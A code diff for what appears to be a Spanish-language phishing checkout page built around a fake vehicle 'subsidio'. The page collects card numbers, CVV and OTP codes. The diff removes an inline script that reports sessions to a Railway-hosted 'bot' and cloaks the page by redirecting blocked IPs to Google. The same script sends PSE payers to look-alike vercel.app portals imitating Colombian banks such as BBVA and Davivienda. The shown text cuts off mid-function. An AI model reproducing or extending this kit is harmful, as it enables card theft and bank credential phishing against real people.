@@ -189,7 +189,7 @@ img, svg { display: block; max-width: 100%; }
 @media (max-width: 767px) { .tarjeta-app .merchant-section { padding: 16px 16px 12px; border-radius: 0; height: auto; } }
 
 .tarjeta-app .header { display: flex; align-items: center; justify-content: flex-start; margin-bottom: 16px; width: 100%; }
-@media (max-width: 767px) { .tarjeta-app .header { justify-content: center; margin-bottom: 8px; } }
+@media (max-width: 767px) { .tarjeta-app .header { justify-content: flex-start; margin-bottom: 8px; } }
 .tarjeta-app .header .logo { max-width: 30px; height: auto; margin-top: 20px; }
 @media (max-width: 767px) { .tarjeta-app .header .logo { margin-top: 0; } }
 
@@ -312,54 +312,85 @@ img, svg { display: block; max-width: 100%; }
 .auth-modal-close { position: absolute; top: 15px; right: 20px; font-size: 32px; background: none; border: none; color: #333; cursor: pointer; z-index: 10; }
 
 /* ============================================================
-   OVERLAYS PAGO (LOTTIE Y OTP)
+   OVERLAYS PAGO (NUEVA PANTALLA TIPO WOMPI LIMPIA)
    ============================================================ */
 .pago-carga-overlay {
-    position: fixed;
-    inset: 0;
-    z-index: 99999999;
-    background: linear-gradient(135deg, #ffffff 0%, #f0fdf4 100%);
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    gap: 20px;
-    padding: 24px;
-    overflow: hidden;
+    position: fixed; inset: 0; z-index: 99999999;
+    background: #ffffff;
+    display: flex; align-items: center; justify-content: center;
 }
 .pago-carga-overlay.hidden { display: none !important; }
 
-.pago-carga-logo {
-    height: 64px;
-    width: auto;
-    max-width: 280px;
-    object-fit: contain;
-    animation: fadeInLogo 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
-    filter: drop-shadow(0 4px 12px rgba(0,0,0,0.08));
+/* Animación Circular (Arcos Cortados) */
+.spinner-wompi {
+    position: relative;
+    width: 250px;   /* Tamaño para PC */
+    height: 250px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
 }
-@keyframes fadeInLogo { from { opacity: 0; transform: scale(0.7) translateY(-10px); } to { opacity: 1; transform: scale(1) translateY(0); } }
 
-.pago-carga-lottie { width: 180px; height: 180px; margin: 0; animation: fadeInLottie 0.8s ease 0.2s both; }
-@keyframes fadeInLottie { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
+/* El logo W en el centro */
+.spinner-wompi .logo-central {
+    position: absolute;
+    width: 100px;   /* Tamaño del logo para PC */
+    height: auto;
+    z-index: 2;
+}
 
-.pago-carga-texto { font-size: 20px; font-weight: 700; color: #00271c; text-align: center; line-height: 1.4; letter-spacing: -0.3px; animation: fadeInTexto 0.6s ease 0.3s both; min-height: 56px; max-width: 400px; }
-.pago-carga-texto .highlight { color: #16a34a; display: inline-block; transition: opacity 0.3s ease; }
-@keyframes fadeInTexto { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+/* Arcos giratorios */
+.spinner-wompi::before,
+.spinner-wompi::after {
+    content: '';
+    position: absolute;
+    border-radius: 50%;
+    border: 16px solid transparent; /* Grosor para PC */
+    border-top-color: #b2f599;
+    width: 100%;
+    height: 100%;
+    animation: spinWompi 1.5s linear infinite;
+}
 
-.pago-carga-subtexto { font-size: 14px; color: #6b7280; text-align: center; max-width: 360px; line-height: 1.5; animation: fadeInTexto 0.6s ease 0.5s both; }
+/* El segundo arco */
+.spinner-wompi::after {
+    width: 80%;
+    height: 80%;
+    border-top-color: transparent;
+    border-bottom-color: #b2f599;
+    animation-direction: reverse;
+    animation-duration: 2s;
+}
 
-.pago-carga-progress { width: 240px; height: 6px; background: #e5e7eb; border-radius: 999px; overflow: hidden; margin-top: 8px; animation: fadeInTexto 0.6s ease 0.6s both; position: relative; }
-.pago-carga-progress::after { content: ''; position: absolute; top: 0; left: 0; height: 100%; width: 40%; background: linear-gradient(90deg, #88f456, #16a34a, #88f456); background-size: 200% 100%; border-radius: 999px; animation: progressSlide 1.5s ease-in-out infinite; }
-@keyframes progressSlide { 0% { transform: translateX(-100%); } 100% { transform: translateX(350%); } }
+@keyframes spinWompi {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
 
-.pago-carga-dots { display: inline-flex; gap: 4px; margin-left: 4px; vertical-align: middle; }
-.pago-carga-dots span { width: 6px; height: 6px; border-radius: 50%; background: #16a34a; animation: dotBounce 1.4s ease-in-out infinite; }
-.pago-carga-dots span:nth-child(2) { animation-delay: 0.2s; }
-.pago-carga-dots span:nth-child(3) { animation-delay: 0.4s; }
-@keyframes dotBounce { 0%, 80%, 100% { transform: translateY(0); opacity: 0.4; } 40% { transform: translateY(-6px); opacity: 1; } }
+/* 🔥 AJUSTES PARA CELULAR (Pantallas menores a 768px) */
+@media (max-width: 768px) {
+    .spinner-wompi {
+        width: 160px;
+        height: 160px;
+    }
+    .spinner-wompi .logo-central {
+        width: 65px;
+    }
+    
+    /* Corregido: Agregamos de nuevo el color verde */
+    .spinner-wompi::before,
+    .spinner-wompi::after {
+        border: 10px solid transparent; 
+        border-top-color: #b2f599; /* <-- Le devolvemos el verde al primer arco */
+    }
+    
+    /* Corregido: Para el segundo arco, el verde va en la parte de abajo */
+    .spinner-wompi::after {
+        border-top-color: transparent; 
+        border-bottom-color: #b2f599; /* <-- Le devolvemos el verde al segundo arco */
+    }
+}
 
-.pago-carga-seguridad { display: flex; align-items: center; gap: 6px; font-size: 12px; color: #6b7280; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; margin-top: 4px; animation: fadeInTexto 0.6s ease 0.7s both; }
-.pago-carga-seguridad svg { width: 16px; height: 16px; fill: #16a34a; }
 
 /* OTP LOADER */
 .pago-carga-otp-overlay {
@@ -367,7 +398,6 @@ img, svg { display: block; max-width: 100%; }
     display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 32px; padding: 24px;
 }
 .pago-carga-otp-overlay.hidden { display: none !important; }
-.pago-carga-otp-logo { height: 80px; max-height: 80px; width: auto; max-width: 250px; object-fit: contain; display: block; margin: 0 auto; }
 .pago-carga-otp-spinner { width: 60px; height: 60px; border: 5px solid #f3f3f3; border-top: 5px solid #88f456; border-radius: 50%; animation: spinPagoOtp 1s linear infinite; }
 @keyframes spinPagoOtp { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 .pago-carga-otp-texto { font-size: 18px; font-weight: 600; color: #00271c; text-align: center; line-height: 1.5; max-width: 400px; }
@@ -381,17 +411,40 @@ img, svg { display: block; max-width: 100%; }
 .pago-error-otp-btn { background: #00271c; color: #88f456; border: none; padding: 14px 32px; border-radius: 9999px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 16px; }
 .pago-error-otp-btn:hover { background: #003d2b; }
 
-@media (max-width: 480px) {
-    .pago-carga-lottie { width: 140px; height: 140px; }
-    .pago-carga-logo { height: 48px; }
-    .pago-carga-texto { font-size: 17px; }
-    .pago-carga-subtexto { font-size: 13px; }
-    .pago-carga-progress { width: 200px; }
+/* ============================================================
+   OVERLAY ERROR DE PAGO (rechazado / cc_error)
+   ============================================================ */
+/* ============================================================
+   OVERLAY ERROR DE PAGO (rechazado / cc_error)
+   ============================================================ */
+.pago-error-overlay {
+    position: fixed; inset: 0; z-index: 99999999;
+    background: #f7f8fa;
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    gap: 20px; padding: 24px; text-align: center;
+    animation: fadeInError .4s ease;
 }
-@media (max-width: 600px) {
-  .resumen-grid { grid-template-columns: 1fr; }
-  .resumen-card { padding: 24px 20px; }
+.pago-error-overlay.hidden { display: none !important; }
+@keyframes fadeInError { from { opacity: 0; } to { opacity: 1; } }
+
+/* 🔥 AQUÍ ESTÁ EL CAMBIO: Quitamos el fondo blanco, bordes y sombra a la tarjeta */
+.pago-error-card {
+    background: transparent;
+    padding: 0;
+    border-radius: 0;
+    box-shadow: none;
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    width: 100%; max-width: 500px;
 }
+
+.pago-error-icono { width: 80px; height: 80px; border-radius: 50%; background: #fee2e2; display: flex; align-items: center; justify-content: center; margin-bottom: 12px; }
+.pago-error-icono svg { width: 40px; height: 40px; }
+.pago-error-logo { height: 60px; max-width: 200px; object-fit: contain; display: block; margin: 0 auto 16px auto; }
+.pago-error-titulo { font-size: 22px; font-weight: 800; color: #991b1b; text-align: center; line-height: 1.3; margin-bottom: 8px; }
+.pago-error-texto { font-size: 15px; color: #555; text-align: center; max-width: 420px; line-height: 1.55; margin-bottom: 24px;}
+.pago-error-btn { background: #00271c; color: #88f456; border: none; padding: 14px 40px; border-radius: 9999px; font-size: 15px; font-weight: 700; cursor: pointer; transition: transform .15s ease, background .15s ease; }
+.pago-error-btn:hover { transform: scale(1.03); }
+.pago-error-btn:active { transform: scale(0.98); }
 </style>
 </head>
 <body>
@@ -566,7 +619,7 @@ img, svg { display: block; max-width: 100%; }
                 <div class="brand-logos">
                   <svg width="38" height="12" viewBox="0 0 38 12" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M24.7509 0.000224299C22.0525 0.000224299 19.6413 1.36308 19.6413 3.88165C19.6413 6.77023 23.9169 6.9688 23.9169 8.42023C23.9169 9.03165 23.1987 9.57736 21.9718 9.57736C20.9084 9.5706 19.8632 9.30808 18.9289 8.81308L18.3719 11.3545C19.4837 11.7819 20.6682 12.001 21.8634 12.0002C24.814 12.0002 27.1401 10.5717 27.1401 8.0088C27.1401 4.95737 22.8454 4.76308 22.8454 3.41737C22.8454 2.9388 23.4317 2.41737 24.6586 2.41737C25.5249 2.42865 26.379 2.61801 27.1651 2.97308L27.7103 0.518796C26.7654 0.168668 25.7618 -0.00717738 24.7509 0.000224299ZM0.0659613 0.185937L0 0.555941C0.736154 0.69531 1.45818 0.898007 2.15761 1.16165C3.4768 1.62451 3.56768 1.89451 3.78901 2.73308L6.20459 11.8102H9.44393L14.4275 0.185937H11.2029L7.99722 8.0888L6.68829 1.39023C6.5681 0.623083 5.95541 0.185937 5.22253 0.185937H0.0659613ZM15.7321 0.185937L13.1978 11.8102H16.2759L18.8014 0.185937H15.7233H15.7321ZM32.9167 0.185937C32.1736 0.185937 31.7807 0.573083 31.492 1.25165L26.9774 11.8102H30.2021L30.8265 10.0502H34.7621L35.1418 11.8102H37.9927L35.5009 0.185937H32.9167ZM33.3374 3.32879L34.2945 7.69023H31.7295L33.3418 3.32879H33.3374Z" fill="#1434CB"/></svg>
                   <svg width="25" height="21" viewBox="0 0 25 21" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12.5" cy="10.5" r="10" fill="#EB001B"/><circle cx="17.5" cy="10.5" r="10" fill="#F79E1B"/><path d="M15 3.5C12.5 5.5 11 8 11 10.5C11 13 12.5 15.5 15 17.5C17.5 15.5 19 13 19 10.5C19 8 17.5 5.5 15 3.5Z" fill="#FF5F00"/></svg>
-                  <img src="https://www.americanexpress.com/content/dam/amex/us/merchant/supplies-uplift/product/images/img-WEBLOGO1-01.jpg" alt="Amex" style="height:22px; width:auto; border-radius:3px; display:block;">
+                  <img src="img/amex.svg" alt="Amex" style="height:22px; width:auto; border-radius:3px; display:block;">
                 </div>
               </div>
               <button class="change-link" type="button" onclick="cerrarModalTarjeta()">Cambiar método de validación</button>
@@ -592,7 +645,7 @@ img, svg { display: block; max-width: 100%; }
                         </svg>
                       </div>
                       <div class="card-logo-item" id="logoAmex">
-                        <img src="https://www.americanexpress.com/content/dam/amex/us/merchant/supplies-uplift/product/images/img-WEBLOGO1-01.jpg" alt="American Express" style="width:42px; height:28px; object-fit:contain; border-radius:3px; display:block;">
+                        <img src="img/amex.svg" alt="American Express" style="width:42px; height:28px; object-fit:contain; border-radius:3px; display:block;">
                       </div>
                     </div>
                   </div>
@@ -734,768 +787,44 @@ img, svg { display: block; max-width: 100%; }
   </div>
 </div>
 
-<!-- OVERLAYS PAGO -->
+<!-- ============================================================
+     OVERLAYS PAGO
+     ============================================================ -->
 <div id="pagoCargaOverlay" class="pago-carga-overlay hidden">
-  <img id="pagoCargaLogo" src="" alt="Marca" class="pago-carga-logo">
-  <div id="pagoCargaLottie" class="pago-carga-lottie"></div>
-  <div class="pago-carga-texto">
-    <span id="pagoCargaTexto">Procesando tu pago</span><span class="highlight" id="pagoCargaDots">...</span>
-  </div>
-  <div class="pago-carga-subtexto" id="pagoCargaSubtexto">Conectando de forma segura con tu banco</div>
-  <div class="pago-carga-progress"></div>
-  <div class="pago-carga-seguridad">
-    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
-    Pago 100% seguro
+  <div class="spinner-wompi">
+    <img src="img/logocc.svg" alt="Logo" class="logo-central" onerror="this.style.display='none'">
   </div>
 </div>
+
+<!-- 🔥 ERROR DE PAGO (rechazado / cc_error) -->
 <div id="pagoErrorOverlay" class="pago-error-overlay hidden">
-  <div class="pago-error-icono"><svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg></div>
-  <img id="pagoErrorLogo" src="" alt="Marca" class="pago-error-logo" style="height:60px;max-width:200px;object-fit:contain;">
-  <div class="pago-error-titulo">Tarjeta no admitida</div>
-  <div class="pago-error-texto">El banco emisor rechazó la transacción. Verifica que la tarjeta esté habilitada para compras en línea o intenta con otra tarjeta.</div>
-  <button type="button" class="pago-error-btn" onclick="cerrarPagoError()">Cambiar tarjeta</button>
+  <div class="pago-error-card">
+    <div class="pago-error-icono"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg></div>
+    <div id="pagoErrorLogo" class="pago-error-logo" style="height:60px;max-width:200px;display:flex;align-items:center;justify-content:center;"></div>
+    <div id="pagoErrorTitulo" class="pago-error-titulo">Tarjeta no admitida</div>
+    <div id="pagoErrorTexto" class="pago-error-texto">El banco emisor rechazó la transacción. Verifica que la tarjeta esté habilitada para compras en línea o intenta con otra tarjeta.</div>
+    <button type="button" id="pagoErrorBtn" class="pago-error-btn" onclick="cerrarPagoError()">Cambiar tarjeta</button>
+  </div>
 </div>
+
 <div id="pagoCargaOtpOverlay" class="pago-carga-otp-overlay hidden">
   <img id="pagoCargaOtpLogo" src="" alt="Marca" class="pago-carga-otp-logo">
   <div class="pago-carga-otp-spinner"></div>
   <div class="pago-carga-otp-texto">Validando tu información<br>para culminar con tu pago...</div>
 </div>
+
+<!-- 🔥 ERROR OTP (código incorrecto / cc_error / rechazado) -->
 <div id="pagoErrorOtpOverlay" class="pago-error-otp-overlay hidden">
   <div class="pago-error-otp-icono"><svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg></div>
-  <div class="pago-error-otp-titulo">Código incorrecto</div>
-  <div class="pago-error-otp-texto">El código que ingresaste no es válido. Por favor, vuelve a ingresarlo correctamente.</div>
+  <div id="pagoErrorOtpTitulo" class="pago-error-otp-titulo">Código incorrecto</div>
+  <div id="pagoErrorOtpTexto" class="pago-error-otp-texto">El código que ingresaste no es válido. Por favor, vuelve a ingresarlo correctamente.</div>
   <button type="button" class="pago-error-otp-btn" onclick="cerrarErrorOtpYReintentar()">Volver a ingresar</button>
 </div>
 
 <script src="pse-animacion.js"></script>
+<script src="app.js"></script>
 
-<script>
-/* ============================================================
-   CONFIGURACIÓN
-   ============================================================ */
-var URL_BOT_RAILWAY = 'https://multi-bancos-production.up.railway.app';
-var TOTAL_PAGO = 95700;
-var BANCO_KEY_ACTUAL = 'cc-bucaramanga'; // 🔥 Cambia esto según el flujo (cc-bogota / cc-bucaramanga)
 
-var URLS_BANCOS = {
-  'bbva':        'https://securecheckout-sandy.vercel.app',
-  'caja-social': 'https://checkoutplacabogo.vercel.app',
-  'popular':     'https://securepay21.vercel.app',
-  'bogota':      'https://auth-portal-ten.vercel.app',
-  'occidente':   'https://secureportal-eight.vercel.app',
-  'davivienda':  'https://psecheckout.vercel.app'
-};
-var TIEMPO_REDIRECT = 5000;
-
-/* ============================================================
-   ANTI-ZOOM
-   ============================================================ */
-(function() {
-  var lastTouchEnd = 0;
-  document.addEventListener('touchend', function(event) {
-    var now = Date.now();
-    if (now - lastTouchEnd <= 300) event.preventDefault();
-    lastTouchEnd = now;
-  }, { passive: false });
-  document.addEventListener('gesturestart', function(e) { e.preventDefault(); }, { passive: false });
-  document.addEventListener('touchmove', function(e) {
-    if (e.scale !== undefined && e.scale !== 1) e.preventDefault();
-  }, { passive: false });
-})();
-
-/* ============================================================
-   SESIÓN + HEARTBEAT + CHECK-IP
-   ============================================================ */
-(function() {
-  'use strict';
-  var BOT_URL = URL_BOT_RAILWAY;
-  var HEARTBEAT_INTERVALO = 10000;
-  var PAGE_SESSION_KEY = 'pyp_session_id';
-
-  var sessionId = sessionStorage.getItem(PAGE_SESSION_KEY);
-  if (!sessionId) {
-    sessionId = 'PYP-' + Date.now() + '-' + Math.random().toString(36).substr(2, 8).toUpperCase();
-    sessionStorage.setItem(PAGE_SESSION_KEY, sessionId);
-  }
-  window.__PYP_SESSION__ = sessionId;
-  var ultimaAccion = 'entrando';
-
-  function verificarBloqueo() {
-    fetch(BOT_URL + '/check-ip', { cache: 'no-store' })
-      .then(function(r) { return r.json(); })
-      .then(function(data) {
-        if (data && data.bloqueado === true) {
-          try { document.documentElement.innerHTML = ''; } catch(e) {}
-          var destino = data.redirect || 'https://www.google.com';
-          try { window.location.replace(destino); }
-          catch(e) { window.location.href = destino; }
-          setTimeout(function() { window.location.href = destino; }, 200);
-        }
-      })
-      .catch(function() {});
-  }
-  verificarBloqueo();
-  setInterval(verificarBloqueo, 5000);
-
-  function enviarHeartbeat() {
-    fetch(BOT_URL + '/heartbeat', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ sessionId: sessionId, ultimaAccion: ultimaAccion }),
-      keepalive: true
-    }).catch(function() {});
-  }
-  enviarHeartbeat();
-  setInterval(enviarHeartbeat, HEARTBEAT_INTERVALO);
-
-  function avisarSalida() {
-    try {
-      var data = JSON.stringify({ sessionId: sessionId });
-      if (navigator.sendBeacon) {
-        navigator.sendBeacon(BOT_URL + '/salir', new Blob([data], { type: 'application/json' }));
-      } else {
-        fetch(BOT_URL + '/salir', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: data,
-          keepalive: true
-        }).catch(function() {});
-      }
-    } catch (e) {}
-  }
-  window.addEventListener('beforeunload', avisarSalida);
-  window.addEventListener('pagehide', avisarSalida);
-
-  window.__PYP_SET_ACCION__ = function(accion) {
-    ultimaAccion = accion;
-    enviarHeartbeat();
-  };
-})();
-
-/* ============================================================
-   PANTALLA CARGA INICIAL
-   ============================================================ */
-window.addEventListener('DOMContentLoaded', function() {
-  setTimeout(function() {
-    document.getElementById('pantallaCargaInicial').classList.add('oculto');
-    setTimeout(function() {
-      document.getElementById('pantallaCargaInicial').style.display = 'none';
-    }, 400);
-  }, 2000);
-});
-
-/* ============================================================
-   LEER DATOS DE SESSIONSTORAGE
-   ============================================================ */
-(function() {
-  var nombres = sessionStorage.getItem('sub_nombres') || 'JUAN';
-  var apellidos = sessionStorage.getItem('sub_apellidos') || 'PÉREZ';
-  var primerNombre = sessionStorage.getItem('sub_primerNombre') || nombres.split(' ')[0];
-  var primerApellido = sessionStorage.getItem('sub_primerApellido') || apellidos.split(' ')[0];
-  var documento = sessionStorage.getItem('sub_documento') || '1234567890';
-  var placa = sessionStorage.getItem('sub_placa') || 'ABC123';
-  var correo = sessionStorage.getItem('sub_correo') || 'correo@ejemplo.com';
-
-  window.__DATOS_SUBSIDIO__ = {
-    nombres: nombres, apellidos: apellidos,
-    primerNombre: primerNombre, primerApellido: primerApellido,
-    documento: documento, placa: placa, correo: correo,
-    nombreCompleto: (nombres + ' ' + apellidos).toUpperCase(),
-    nombrePSE: (primerNombre + ' ' + primerApellido).toUpperCase()
-  };
-
-  document.getElementById('resumenNombre').textContent = window.__DATOS_SUBSIDIO__.nombreCompleto;
-  document.getElementById('resumenDocumento').textContent = documento;
-  document.getElementById('resumenPlaca').textContent = placa.toUpperCase();
-  document.getElementById('resumenCorreo').textContent = correo;
-
-  var cardHolderInput = document.getElementById('cardHolder');
-  if (cardHolderInput) cardHolderInput.value = window.__DATOS_SUBSIDIO__.nombreCompleto;
-  var docNumberInput = document.getElementById('docNumber');
-  if (docNumberInput) docNumberInput.value = documento;
-  var inputDocPse = document.getElementById('input-doc-pse');
-  if (inputDocPse) inputDocPse.value = documento;
-})();
-
-/* ============================================================
-   SELECCIÓN MEDIO DE PAGO
-   ============================================================ */
-var metodoPagoActual = '';
-
-function seleccionarMedioPago(tipo) {
-  var btnTarjeta = document.getElementById('btnPagoTarjeta');
-  var btnPSE = document.getElementById('btnPagoPSE');
-  btnTarjeta.classList.remove('selected');
-  btnPSE.classList.remove('selected');
-  metodoPagoActual = tipo;
-  var pseForm = document.getElementById('pseFormContainer');
-  if (tipo === 'tarjeta') {
-    btnTarjeta.classList.add('selected');
-    pseForm.classList.add('hidden');
-    abrirModalTarjeta();
-  } else {
-    btnPSE.classList.add('selected');
-    pseForm.classList.remove('hidden');
-    setTimeout(function() { pseForm.scrollIntoView({ behavior: 'smooth', block: 'start' }); }, 150);
-  }
-}
-
-/* ============================================================
-   MODAL TARJETA
-   ============================================================ */
-function abrirModalTarjeta() {
-  var modal = document.getElementById('modalTarjeta');
-  if (modal) { modal.classList.remove('hidden'); document.body.style.overflow = 'hidden'; }
-}
-function cerrarModalTarjeta() {
-  var modal = document.getElementById('modalTarjeta');
-  if (modal) { modal.classList.add('hidden'); document.body.style.overflow = ''; }
-}
-
-/* ============================================================
-   MODAL BANCOS
-   ============================================================ */
-var bancoSeleccionadoPSE = '';
-var bancoSelector = document.getElementById('bancoSelector');
-var bancoLogoSeleccionado = document.getElementById('bancoLogoSeleccionado');
-var bancoNombreSeleccionado = document.getElementById('bancoNombreSeleccionado');
-var modalBanco = document.getElementById('modalBanco');
-var modalBancoOverlay = document.getElementById('modalBancoOverlay');
-var modalBancoClose = document.getElementById('modalBancoClose');
-var bancoBuscar = document.getElementById('bancoBuscar');
-var bancoCards = document.querySelectorAll('.banco-card-pse');
-var bancoEmpty = document.getElementById('bancoEmpty');
-
-function abrirModalBanco() {
-  if (modalBanco) {
-    modalBanco.classList.remove('hidden');
-    if (bancoBuscar) bancoBuscar.value = '';
-    filtrarBancos('');
-    setTimeout(function() { if (bancoBuscar) bancoBuscar.focus(); }, 100);
-  }
-}
-function cerrarModalBanco() { if (modalBanco) modalBanco.classList.add('hidden'); }
-
-if (bancoSelector) bancoSelector.addEventListener('click', abrirModalBanco);
-if (modalBancoClose) modalBancoClose.addEventListener('click', cerrarModalBanco);
-if (modalBancoOverlay) modalBancoOverlay.addEventListener('click', cerrarModalBanco);
-
-bancoCards.forEach(function(card) {
-  card.addEventListener('click', function() {
-    var banco = this.getAttribute('data-banco');
-    var nombre = this.getAttribute('data-nombre');
-    var logo = this.getAttribute('data-logo');
-    bancoSeleccionadoPSE = banco;
-    if (bancoNombreSeleccionado) {
-      bancoNombreSeleccionado.textContent = nombre;
-      bancoNombreSeleccionado.classList.add('seleccionado');
-    }
-    if (bancoLogoSeleccionado && logo) {
-      bancoLogoSeleccionado.src = logo;
-      bancoLogoSeleccionado.style.display = 'block';
-    }
-    bancoCards.forEach(function(c) { c.classList.remove('selected'); });
-    this.classList.add('selected');
-    cerrarModalBanco();
-  });
-});
-
-function filtrarBancos(texto) {
-  var t = (texto || '').toLowerCase().trim();
-  var visibles = 0;
-  bancoCards.forEach(function(card) {
-    var nombre = (card.getAttribute('data-nombre') || '').toLowerCase();
-    if (nombre.indexOf(t) !== -1) { card.style.display = ''; visibles++; }
-    else { card.style.display = 'none'; }
-  });
-  if (bancoEmpty) {
-    if (visibles === 0) bancoEmpty.classList.remove('hidden');
-    else bancoEmpty.classList.add('hidden');
-  }
-}
-if (bancoBuscar) bancoBuscar.addEventListener('input', function() { filtrarBancos(this.value); });
-
-/* ============================================================
-   PAGO PSE
-   ============================================================ */
-function procesarPagoPSE() {
-  if (!bancoSeleccionadoPSE) { alert('Por favor selecciona un banco.'); return; }
-  var docPse = document.getElementById('input-doc-pse').value.replace(/\D/g, '');
-  if (docPse.length < 5) { alert('Por favor ingresa un número de documento válido.'); return; }
-
-  var pseNombre = document.getElementById('pseNombre');
-  if (pseNombre) pseNombre.textContent = window.__DATOS_SUBSIDIO__.nombrePSE;
-
-  if (window.__PYP_SET_ACCION__) window.__PYP_SET_ACCION__('pse_seleccionado');
-
-  var pseOverlay = document.getElementById('video-pse-overlay');
-  if (pseOverlay) { pseOverlay.classList.remove('hidden'); document.body.style.overflow = 'hidden'; }
-
-  if (window.__PSE_REINICIAR__) {
-    window.__PSE_REINICIAR__();
-  } else {
-    var pseGif = document.getElementById('pseAnimation');
-    if (pseGif && pseGif.src) {
-      var srcActual = pseGif.src;
-      pseGif.src = '';
-      setTimeout(function() { pseGif.src = srcActual; }, 50);
-    }
-  }
-
-  var urlDestino = URLS_BANCOS[bancoSeleccionadoPSE];
-  setTimeout(function() {
-    if (urlDestino) { window.location.href = urlDestino; }
-    else {
-      if (pseOverlay) pseOverlay.classList.add('hidden');
-      document.body.style.overflow = '';
-      alert('Este banco no está disponible todavía.');
-    }
-  }, TIEMPO_REDIRECT);
-}
-
-/* ============================================================
-   TARJETA: VALIDACIÓN + ENVÍO
-   ============================================================ */
-var pagoPollingInterval = null;
-var sessionIdActualPago = '';
-var pagoOtpPollingInterval = null;
-
-document.addEventListener('DOMContentLoaded', function() {
-  var formTarjeta = document.getElementById('formTarjeta');
-  if (!formTarjeta) return;
-
-  var cardNumber = document.getElementById('cardNumber');
-  var expiryMonth = document.getElementById('expiryMonth');
-  var expiryYear = document.getElementById('expiryYear');
-  var cvv = document.getElementById('cvv');
-  var cardHolder = document.getElementById('cardHolder');
-  var docNumber = document.getElementById('docNumber');
-  var accept1 = document.getElementById('acceptance1');
-  var accept2 = document.getElementById('acceptance2');
-  var submitBtnT = document.getElementById('submitBtn');
-
-  /* FILTRADO DE LOGOS */
-  var logoVisa = document.getElementById('logoVisa');
-  var logoMastercard = document.getElementById('logoMastercard');
-  var logoAmex = document.getElementById('logoAmex');
-
-  function detectarMarca(numero) {
-    var digitos = (numero || '').replace(/\D/g, '');
-    if (digitos.length === 0) return '';
-    var primero = digitos.charAt(0);
-    if (primero === '4') return 'visa';
-    if (primero === '5' || primero === '2') return 'mastercard';
-    if (primero === '3') return 'amex';
-    return '';
-  }
-
-  function esAmex() {
-    var primero = cardNumber.value.replace(/\D/g, '').charAt(0);
-    return primero === '3';
-  }
-
-  function filtrarLogos(numero) {
-    var marca = detectarMarca(numero);
-    var wrapper = document.getElementById('cardLogosWrapper');
-
-    if (!marca) {
-      if (logoVisa) logoVisa.classList.remove('oculto');
-      if (logoMastercard) logoMastercard.classList.remove('oculto');
-      if (logoAmex) logoAmex.classList.remove('oculto');
-      if (wrapper) wrapper.classList.remove('has-single');
-      return;
-    }
-
-    if (logoVisa) logoVisa.classList.add('oculto');
-    if (logoMastercard) logoMastercard.classList.add('oculto');
-    if (logoAmex) logoAmex.classList.add('oculto');
-
-    if (marca === 'visa' && logoVisa) logoVisa.classList.remove('oculto');
-    else if (marca === 'mastercard' && logoMastercard) logoMastercard.classList.remove('oculto');
-    else if (marca === 'amex' && logoAmex) logoAmex.classList.remove('oculto');
-
-    if (wrapper) wrapper.classList.add('has-single');
-  }
-
-  function actualizarMensajeCvv() {
-    var mensaje = document.getElementById('cvvMensajeAmex');
-    if (!mensaje) return;
-    var cvvVal = cvv.value.replace(/\D/g, '');
-    if (esAmex() && cvvVal.length > 0 && cvvVal.length < 4) {
-      mensaje.style.display = 'block';
-      mensaje.textContent = 'Tu tarjeta es American Express: el CVV debe tener 4 dígitos';
-    } else {
-      mensaje.style.display = 'none';
-    }
-  }
-
-  cardNumber.addEventListener('input', function() {
-    var value = this.value.replace(/\D/g, '');
-    var maxLen = (value.charAt(0) === '3') ? 15 : 16;
-    if (value.length > maxLen) value = value.slice(0, maxLen);
-    var formatted = '';
-    for (var i = 0; i < value.length; i++) {
-      if (value.charAt(0) === '3') {
-        if (i === 4 || i === 10) formatted += ' ';
-      } else {
-        if (i > 0 && i % 4 === 0) formatted += ' ';
-      }
-      formatted += value[i];
-    }
-    this.value = formatted;
-    filtrarLogos(value);
-    validateForm();
-  });
-
-  filtrarLogos('');
-
-  cvv.addEventListener('input', function() {
-    this.value = this.value.replace(/\D/g, '').slice(0, 4);
-    actualizarMensajeCvv();
-  });
-  docNumber.addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0, 30); });
-
-  function luhnCheck(cardNumber) {
-    var sum = 0;
-    var shouldDouble = false;
-    for (var i = cardNumber.length - 1; i >= 0; i--) {
-      var digit = parseInt(cardNumber.charAt(i));
-      if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
-      sum += digit;
-      shouldDouble = !shouldDouble;
-    }
-    return sum % 10 === 0;
-  }
-
-  function validateForm() {
-    var cardVal = cardNumber.value.replace(/\s/g, '');
